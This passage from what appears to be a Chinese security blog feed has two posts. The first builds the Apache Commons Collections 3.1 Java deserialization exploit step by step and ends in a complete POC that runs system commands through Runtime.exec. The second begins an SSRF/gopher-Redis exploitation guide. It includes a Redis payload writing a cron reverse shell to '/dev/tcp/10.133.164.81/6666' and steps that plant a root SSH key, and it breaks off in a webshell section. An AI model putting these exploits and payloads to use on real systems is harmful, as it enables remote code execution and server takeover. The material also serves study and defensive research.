class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Commons_collections_Test</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Transformer[] transformers=<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-comment">//根据transform的执行规则，InvokeTransformer类构造函数的第一个参数为要执行的，第二个参数为一个Class[]，包含了要获取方法的参数类型。第三个参数为invoke的第二个参数</span><br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;&#125;&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">new</span> Object[]&#123;&#125;&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-comment">//把构造好的数组封装成ChainedTransformer</span><br>        ChainedChainedTransformer chainedTransformer=<span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br><br>        <span class="hljs-comment">//序列化数据</span><br>        FileOutputStream fileOutputStream=<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>);<br>        ObjectOutputStream objectOutputStream=<span class="hljs-keyword">new</span> ObjectOutputStream(fileOutputStream);<br>        objectOutputStream.writeObject(chainedTransformer);<br><br>        <span class="hljs-comment">//反序列化数据</span><br>        FileInputStream fileInputStream=<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>);<br>        ObjectInputStream objectInputStream=<span class="hljs-keyword">new</span> ObjectInputStream(fileInputStream);<br><br>        <span class="hljs-comment">//调用反序列化后的ChainedTransformer类中的transform方法触发</span><br>        ChainedTransformer SerialChainTransformer=(ChainedTransformer)objectInputStream.readObject();<br>        SerialChainTransformer.transform(<span class="hljs-keyword">null</span>);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="关于Map的一些补充知识"><a href="#关于Map的一些补充知识" class="headerlink" title="关于Map的一些补充知识"></a>关于Map的一些补充知识</h2><p>Map是java中的接口，Map.Entry是Map的一个内部接口</p><ul><li>keySet()方法返回Map中key值的集合</li><li>entrySet()返回一个Set集合，集合类型为Map.Entry（键值对）</li><li>Map.Entry是Map声明的一个内部接口，Map.Entry表示一个实体即键值对（key-value对）</li><li>getKey()，getValue方法可以修改集合中的元素</li></ul><h2 id="绑定Map和ChainedTransformer"><a href="#绑定Map和ChainedTransformer" class="headerlink" title="绑定Map和ChainedTransformer"></a>绑定Map和ChainedTransformer</h2><p><strong>为什么要绑定Map和ChainedTransformer?</strong></p><p>之前我们把构造好的Transformer数组封装成了一个ChainedTransformer，TransformerMap类的decorate方法可以绑定map和ChainedTransformer，只要在map中添加数据就会自动调用构造好的ChainedTransformer，执行payload，这样降低了触发的难度</p><p><strong>目前的执行过程</strong></p><ol><li>创建一个Map和一个构造好反射链的ChainedTransformer</li><li>调用TransformedMap类的decorate方法创建一个实例，绑定创建好的Map和ChainedTransformer</li><li>利用setValue()函数修改TransformedMap中的键值</li><li>触发ChainedTransformer中的Transform反射链</li></ol><p><code>org.apache.commons.collections.map.TransformedMap#decorate</code></p><p><a href="https://imgtu.com/i/RDxTx0"><img src="https://z3.ax1x.com/2021/07/01/RDxTx0.png" alt="RDxTx0.png"></a></p><p><strong>TransformedMap类的功能？</strong></p><p>Map类是保存键值对的数据结构，common collections中实现了一个TransformedMap类，这个类可以在键值对的key或者value被修改时自动调用我们设置的transform方法进行修饰和变换。decorate方法可以创建一个TransformedMap的实例。</p><p><strong>decorate方法的功能？</strong></p><p>创建一个TransformedMap实例，绑定Map和转换方法<br>它的第一个参数为待转化的Map对象，第二个参数为Map对象内的key要经过的转化方法（可为单个方法，也可为链，也可为空），第三个参数为Map对象内的value要经过的转化方法。</p><p>代码实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Commons_collections_Test</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Transformer[] transformers=<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-comment">//根据transform的执行规则，InvokeTransformer类构造函数的第一个参数为要执行的，第二个参数为一个Class[]，包含了要获取方法的参数类型。第三个参数为invoke的第二个参数</span><br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;&#125;&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">new</span> Object[]&#123;&#125;&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-comment">//把构造好的数组封装成ChainedTransformer</span><br>        ChainedTransformer chainedTransformer=<span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br><br>        Map innerMap=<span class="hljs-keyword">new</span> HashMap();<br>        innerMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br><br>        Map map=TransformedMap.decorate(innerMap,<span class="hljs-keyword">null</span>,chainedTransformer);<br><br>        <span class="hljs-comment">//序列化map</span><br>        FileOutputStream fileOutputStream=<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>);<br>        ObjectOutputStream objectOutputStream=<span class="hljs-keyword">new</span> ObjectOutputStream(fileOutputStream);<br>        objectOutputStream.writeObject(map);<br><br>        FileInputStream fileInputStream=<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>);<br>        ObjectInputStream objectInputStream=<span class="hljs-keyword">new</span> ObjectInputStream(fileInputStream);<br>        <span class="hljs-comment">//反序列化</span><br>        Map UnserializedMap=(Map)objectInputStream.readObject();<br><br>        <span class="hljs-comment">//只要修改Map的值就会触发转换链，执行payload</span><br><br>        <span class="hljs-comment">//向Map中添加新值</span><br>        <span class="hljs-comment">//UnserializedMap.put(&quot;123&quot;,&quot;123&quot;);</span><br>        <span class="hljs-comment">//修改键值</span><br>        Map.Entry entry  = (Map.Entry) UnserializedMap.entrySet().iterator().next();<br>        entry.setValue(<span class="hljs-string">&quot;foobar&quot;</span>);<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>目前存在的问题？</strong></p><p>现在触发条件变成了经过迭代器迭代调用<code>setValue</code>函数修改<code>Map</code>值来触发漏洞，</p><p>但是仍然依赖于调用<code>setValue()</code>，需要进一步延长利用链，在调用readObject()方法时直接触发payload</p><h2 id="AnnotationInvocationHandler的readObject复写点"><a href="#AnnotationInvocationHandler的readObject复写点" class="headerlink" title="AnnotationInvocationHandler的readObject复写点"></a>AnnotationInvocationHandler的readObject复写点</h2><p><strong>进一步延长利用链</strong></p><p>java在反序列化中会优先调用复写的readObject，那么如果某个可以被序列化中的类重写了readObject()方法，并且在readObject()方法中存在修改Map类型变量键值的操作，同时Map类型变量可控的话，就可以实现一步到位，一调用readObject()就触发payload。</p><p>概括一下目标类需要满足的三个条件</p><ol><li>存在复写的readObject()方法</li><li>readObject()方法中存在修改Map类型变量键值的操作</li><li>Map类型变量可控</li></ol><p>这个类就是<code>sun.reflect.annotation.AnnotationInvocationHandler</code></p><p><code>AnnotationInvocationHandler</code>构造函数</p><p>可以看到有一个可控的成员变量<code>memberValues</code>，接收传入的Map参数，</p><p><a href="https://imgtu.com/i/RDxHMV"><img src="https://z3.ax1x.com/2021/07/01/RDxHMV.png" alt="RDxHMV.png"></a></p><p><code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code></p><p>这里对<code>memberValues</code>进行了<code>setValue</code>操作，触发payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream var1)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        var1.defaultReadObject();<br>        AnnotationType var2 = <span class="hljs-keyword">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            var2 = AnnotationType.getInstance(<span class="hljs-keyword">this</span>.type);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalArgumentException var9) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        Map var3 = var2.memberTypes();<br>        Iterator var4 = <span class="hljs-keyword">this</span>.memberValues.entrySet().iterator();<br><br>        <span class="hljs-keyword">while</span>(var4.hasNext()) &#123;<br>            Entry var5 = (Entry)var4.next();<br>            String var6 = (String)var5.getKey();<br>            Class var7 = (Class)var3.get(var6);<br>            <span class="hljs-keyword">if</span> (var7 != <span class="hljs-keyword">null</span>) &#123;<br>                Object var8 = var5.getValue();<br>                <span class="hljs-keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    var5.setValue((<span class="hljs-keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="hljs-string">&quot;[&quot;</span> + var8 + <span class="hljs-string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6))); <span class="hljs-comment">//存在setValue</span><br>                &#125;<br>            &#125;<br>        &#125;<br><br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>过程总结</p><ol><li>首先构造一个Map和一个能够执行代码的ChainedTransformer()，</li><li>调用TransformedMap.decorate绑定Map和ChainedTransformer，生成一个TransformedMap实例</li><li>实例化AnnotationInvocationHandler类，并对其进行序列化，</li><li>当触发readObject()反序列化的时候，就能实现命令执行。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileNotFoundException;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.util.Map.Entry;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">POC_Test</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-comment">//execArgs: 待执行的命令数组</span><br>        <span class="hljs-comment">//String[] execArgs = new String[] &#123; &quot;sh&quot;, &quot;-c&quot;, &quot;whoami &amp;gt; /tmp/fuck&quot; &#125;;</span><br><br>        <span class="hljs-comment">//transformers: 一个transformer链，包含各类transformer对象（预设转化逻辑）的转化数组</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">            由于Method类的invoke(Object obj,Object args[])方法的定义</span><br><span class="hljs-comment">            所以在反射内写new Class[] &#123;Object.class, Object[].class &#125;</span><br><span class="hljs-comment">            正常POC流程举例：</span><br><span class="hljs-comment">            ((Runtime)Runtime.class.getMethod(&quot;getRuntime&quot;,null).invoke(null,null)).exec(&quot;gedit&quot;);</span><br><span class="hljs-comment">            */</span><br>            <span class="hljs-keyword">new</span> InvokerTransformer(<br>                <span class="hljs-string">&quot;getMethod&quot;</span>,<br>                <span class="hljs-keyword">new</span> Class[] &#123;String.class, Class[].class &#125;,<br>                <span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>] &#125;<br>            ),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<br>                <span class="hljs-string">&quot;invoke&quot;</span>,<br>                <span class="hljs-keyword">new</span> Class[] &#123;Object.class,Object[].class &#125;, <br>                <span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span> &#125;<br>            ),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<br>                <span class="hljs-string">&quot;exec&quot;</span>,<br>                <span class="hljs-keyword">new</span> Class[] &#123;String[].class &#125;,<br>                <span class="hljs-keyword">new</span> Object[] &#123; <span class="hljs-string">&quot;whoami&quot;</span> &#125;<br>                <span class="hljs-comment">//new Object[] &#123; execArgs &#125; </span><br>            )<br>        &#125;;<br><br>        <span class="hljs-comment">//transformedChain: ChainedTransformer类对象，传入transformers数组，可以按照transformers数组的逻辑执行转化操作</span><br>        Transformer transformedChain = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br><br>        <span class="hljs-comment">//BeforeTransformerMap: Map数据结构，转换前的Map，Map数据结构内的对象是键值对形式，类比于python的dict</span><br>        <span class="hljs-comment">//Map&amp;lt;String, String&amp;gt; BeforeTransformerMap = new HashMap&amp;lt;String, String&amp;gt;();</span><br>        Map&lt;String,String&gt; BeforeTransformerMap = <span class="hljs-keyword">new</span> HashMap&lt;String,String&gt;();<br><br>        BeforeTransformerMap.put(<span class="hljs-string">&quot;hello&quot;</span>, <span class="hljs-string">&quot;hello&quot;</span>);<br><br>        <span class="hljs-comment">//Map数据结构，转换后的Map</span><br>       <span class="hljs-comment">/*</span><br><span class="hljs-comment">       TransformedMap.decorate方法,预期是对Map类的数据结构进行转化，该方法有三个参数。</span><br><span class="hljs-comment">            第一个参数为待转化的Map对象</span><br><span class="hljs-comment">            第二个参数为Map对象内的key要经过的转化方法（可为单个方法，也可为链，也可为空）</span><br><span class="hljs-comment">            第三个参数为Map对象内的value要经过的转化方法。</span><br><span class="hljs-comment">       */</span><br>        <span class="hljs-comment">//TransformedMap.decorate(目标Map, key的转化对象（单个或者链或者null）, value的转化对象（单个或者链或者null）);</span><br>        Map AfterTransformerMap = TransformedMap.decorate(BeforeTransformerMap, <span class="hljs-keyword">null</span>, transformedChain);<br><br>        Class cl = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br><br>        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);<br>        ctor.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object instance = ctor.newInstance(Target.class, AfterTransformerMap);<br><br>        File f = <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;temp.bin&quot;</span>);<br>        ObjectOutputStream out = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(f));<br>        out.writeObject(instance);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">思路:构建BeforeTransformerMap的键值对，为其赋值，</span><br><span class="hljs-comment">     利用TransformedMap的decorate方法，对Map数据结构的key/value进行transforme</span><br><span class="hljs-comment">     对BeforeTransformerMap的value进行转换，当BeforeTransformerMap的value执行完一个完整转换链，就完成了命令执行</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     执行本质: ((Runtime)Runtime.class.getMethod(&quot;getRuntime&quot;,null).invoke(null,null)).exec(.........)</span><br><span class="hljs-comment">     利用反射调用Runtime() 执行了一段系统命令, Runtime.getRuntime().exec()</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.anquanke.com/post/id/195865">以Commons-Collections为例谈Java反序列化POC的编写 - 安全客，安全资讯平台</a> </p><p><a href="https://b1ue.cn/archives/166.html">Java 反序列化漏洞始末（1）— Apache Commons - 浅蓝 ‘s blog</a> </p><p><a href="https://www.anquanke.com/post/id/224487">Apache Commons Collections反序列化漏洞分析与复现 - 安全客，安全资讯平台</a> </p><p><a href="https://threezh1.com/2020/12/10/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80_CommonCollection31%E5%88%86%E6%9E%90/#Apache-CommonsCollections3-1-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90">Threezh1’Blog</a> </p><p>[Java入坑：Apache-Commons-Collections-3.1 反序列化漏洞分析 | Passer6y’s Blog](<a href="https://0day.design/2020/01/24/Apache-Commons-Collections-3.1">https://0day.design/2020/01/24/Apache-Commons-Collections-3.1</a> 反序列化漏洞分析/) </p><p><a href="https://www.freebuf.com/vuls/175252.html">Apache-Commons-Collections反序列化漏洞分析 - FreeBuf网络安全行业门户</a></p><p> <a href="https://www.cnblogs.com/tr1ple/p/11505122.html">Apache Commons Collections 反序列化详细分析学习总结 - tr1ple - 博客园</a> </p><p><a href="https://xz.aliyun.com/t/7031">JAVA反序列化 - Commons-Collections组件</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ssrf中gopher+redis的利用总结</title>
    <link href="/2021/04/26/ssrf%E4%B8%ADgopher-redis%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"/>
    <url>/2021/04/26/ssrf%E4%B8%ADgopher-redis%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h1><p>只能在Centos上使用，原因：</p><p>1.redis默认写入文件的权限为644，而ubuntu要求执行定时任务文件<code>/var/spool/cron/crontabs/&lt;username&gt;</code>权限必须是600，否则会报错。而Centos的定时任务文件<code>/var/spool/cron/&lt;username&gt;</code>权限644也可执行。</p><p>2.因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</p><p>3.不同系统中crontrab定时文件位置也会不同Centos的定时任务文件在<code>/var/spool/cron/&lt;username&gt;</code>Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/&lt;username&gt;</code>，Centos和Ubuntu均存在的（需要root权限）<code>/etc/crontab</code> ，高版本的redis默认启动是<code>redis</code>权限，所以无法利用。</p><p>payload</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">set</span> xxx <span class="hljs-string">&quot;\n\n* * * * * bash -i&gt;&amp; /dev/tcp/10.133.164.81/6666 0&gt;&amp;1\n\n&quot;</span><br>config <span class="hljs-builtin-name">set</span> dir /var/spool/cron<br>config <span class="hljs-builtin-name">set</span> dbfilename root<br>save<br><br></code></pre></td></tr></table></figure><h1 id="写入公钥"><a href="#写入公钥" class="headerlink" title="写入公钥"></a>写入公钥</h1><p>向/root/.ssh中写入公钥即可用ssh登陆服务器，高版本redis少有root权限，难以利用</p><p>生成私钥</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ssh-keygen -t rsa</span><br></code></pre></td></tr></table></figure><p>redis命令</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">flushall<br><span class="hljs-builtin-name">set</span> 1 <span class="hljs-string">&#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali</span><br><span class="hljs-string">&#x27;</span><br>config <span class="hljs-builtin-name">set</span> dir /root/.ssh/<br>config <span class="hljs-builtin-name">set</span> dbfilename authorized_keys<br>save<br></code></pre></td></tr></table></figure><h1 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h1><p>比较常用的方法，以[网鼎杯 2020 玄武组]SSRFMe为例</p><p>访问index.php，过滤127.0.0.1，使用<code>http://0.0.0.0</code>绕过，提示要访问hint.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 